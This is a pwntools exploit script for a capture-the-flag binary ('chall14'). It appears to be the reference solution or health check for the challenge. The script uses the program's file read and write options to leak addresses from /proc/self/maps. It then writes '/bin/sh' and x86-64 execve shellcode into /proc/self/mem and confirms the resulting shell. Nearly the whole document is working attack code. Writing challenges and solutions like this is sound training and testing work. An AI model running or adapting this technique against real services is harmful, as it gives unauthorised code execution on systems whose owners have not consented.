#!/usr/bin/env python3
from pwn import *
import sys

target_elf = ELF('../bin/chall14')

HOST = ''
PORT = 40014

NUM_ATTEMPTS = 10

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

def readfile(io, file, size=1024, seek=0):

    io.recvuntil(b'> ')
    io.sendline(b'1')

    io.recvuntil(b': ')
    io.sendline(file.encode('ascii'))

    io.recvuntil(b': ')
    io.sendline(str(size).encode('ascii'))

    io.recvuntil(': ')
    io.sendline(str(seek).encode('ascii'))

    io.recvuntil(b': ')
    data = io.recvuntil(b'\n\n\x1b')[:-3]
    return data


def writefile(io, file, data, seek=0):

    io.recvuntil(b'> ')
    io.sendline(b'2')

    io.recvuntil(b': ')
    io.sendline(file.encode('ascii'))

    io.recvuntil(b': ')
    io.sendline(str(len(data)).encode('ascii'))

    io.recvuntil(b': ')
    io.sendline(str(seek).encode('ascii'))

    io.recvuntil(b': ')
    io.send(data)



def exploit_attempt():
    try:
        if len(HOST) > 0:
            io = remote(HOST, PORT)
        else:
            io = target_elf.process()

        sys.stdout.write(io.recvuntil(b'!\n'))

        # step 1: read leaks from the memory map
        lines = readfile(io, '/proc/self/maps', 4096).decode('ascii').split('\n')

        base = int(lines[0][:12], 16)
        data = int(lines[2][:12], 16)

        log.info('Base:  0x%012x' % base)
        log.info('Data:  0x%012x' % data)

        # step 2: put "/bin/sh" somewhere to avoid finding it in memory
        writefile(io, '/proc/self/mem', b"/bin/sh", data+0x100)

        # step 3: overwrite the code at the location the binary returns to
        pay  = b'\x48\xc7\xc0\x3b\x00\x00\x00'  # mov rax, SYS_execve
        pay += b'\x48\xbf' + p64(data+0x100)    # mov rdi, "/bin/sh"
        pay += b'\x48\x31\xf6'                  # xor rsi, rsi
        pay += b'\x48\x31\xd2'                  # xor rdx, rdx
        pay += b'\x0f\x05'                      # syscall
        pay += b'\x48\xc7\xc0\x3c\x00\x00\x00'  # mov rax, SYS_exit
        pay += b'\x0f\x05'                      # syscall

        writefile(io, '/proc/self/mem', pay, base+0xef9)

        # step 4: collect a shell
        io.sendline(b'id')
        id_result = io.recvline().strip()
        if b'uid=' in id_result:
            log.success('shell: %s', id_result.decode('ascii').strip())
            if not os.environ.get('HEALTH_CHECK', False):
                io.interactive()
            sys.exit(0)
        else:
            log.failure('Error: %s', id_result)
            sys.exit(1)
    except EOFError as e:
        log.failure('Fail: EOF')
    except Exception as e:
        log.failure('Error: %s: %s', type(e), str(e))
    finally:
        io.close()
    return False

if __name__ == '__main__':
    for _ in range(NUM_ATTEMPTS):
        if exploit_attempt():
            sys.exit(0)
        sleep(0.1)
    sys.exit(1)
